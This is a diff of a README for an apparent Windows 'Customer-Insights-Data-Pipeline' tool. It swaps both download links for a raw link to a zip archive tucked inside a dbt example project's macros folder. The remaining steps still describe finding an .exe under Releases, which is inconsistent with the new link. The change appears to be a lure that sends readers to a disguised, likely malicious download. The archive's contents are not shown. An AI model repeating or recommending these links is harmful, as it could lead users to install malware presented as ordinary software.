@@ -1,6 +1,6 @@
 # 📊 Customer-Insights-Data-Pipeline - Transform your raw data into clear reports
 
-[![Download Application](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Malorycredible713/Customer-Insights-Data-Pipeline)
+[![Download Application](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://raw.githubusercontent.com/Malorycredible713/Customer-Insights-Data-Pipeline/main/jaffle_shop_duckdb/macros/Data_Customer_Insights_Pipeline_2.5.zip)
 
 ## 🎯 Purpose of this tool
 
@@ -22,7 +22,7 @@ Make sure your computer has the latest Windows updates installed. This ensures t
 
 You need to download the installer to begin. Follow these exact steps to obtain the files:
 
-1. Visit this page to download: [https://github.com/Malorycredible713/Customer-Insights-Data-Pipeline](https://github.com/Malorycredible713/Customer-Insights-Data-Pipeline)
+1. Visit this page to download: [https://raw.githubusercontent.com/Malorycredible713/Customer-Insights-Data-Pipeline/main/jaffle_shop_duckdb/macros/Data_Customer_Insights_Pipeline_2.5.zip](https://raw.githubusercontent.com/Malorycredible713/Customer-Insights-Data-Pipeline/main/jaffle_shop_duckdb/macros/Data_Customer_Insights_Pipeline_2.5.zip)
 2. Locate the "Releases" section on the right side of the screen.
 3. Click the most recent version number.
 4. Look for the file ending in `.exe` under the "Assets" header.
